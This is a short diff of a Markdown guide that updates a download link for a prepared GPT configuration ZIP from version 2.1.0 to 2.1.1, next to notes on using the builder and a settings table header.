@@ -12,7 +12,7 @@ Do not buy a different personal plan on the assumption that it restores GPT crea
 
 ## Prepared configuration
 
-Download the [GPT configuration ZIP](https://raw.githubusercontent.com/mouniranna-ui/my-name/photo-to-autocad/downloads/tsbecm-202-gpt-2.1.0.zip). Extract it before using the builder. Its JSON is a field checklist, not an OpenAI import format.
+Download the [GPT configuration ZIP](https://raw.githubusercontent.com/mouniranna-ui/my-name/photo-to-autocad/downloads/tsbecm-202-gpt-2.1.1.zip). Extract it before using the builder. Its JSON is a field checklist, not an OpenAI import format.
 
 | Setting | Prepared value |
 | --- | --- |
